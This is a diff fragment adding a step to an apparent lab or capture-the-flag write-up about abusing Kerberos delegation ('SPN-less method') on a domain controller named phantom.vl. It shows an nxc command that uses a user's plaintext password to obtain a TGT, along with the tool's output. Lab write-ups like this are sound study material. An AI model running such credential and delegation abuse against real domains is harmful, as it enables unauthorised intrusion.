@@ -671,3 +671,15 @@ In this example, i dont have the ability to add a machine account nor have i com
 
 So in this instance ill abuse the SPN-less method
 
+Now ill follow the steps from the article
+
+```python
+nxc smb dc.phantom.vl -d phantom.vl -u wsilva -p 'Password123!' --generate-tgt wsilva
+SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.63   445    DC               [+] phantom.vl\wsilva:Password123! 
+SMB         10.129.234.63   445    DC               [+] TGT saved to: wsilva.ccache
+SMB         10.129.234.63   445    DC               [+] Run the following command to use the TGT: export KRB5CCNAME=wsilva.ccache
+```
+
+First ill get a TGT for the account configured for delegation
+
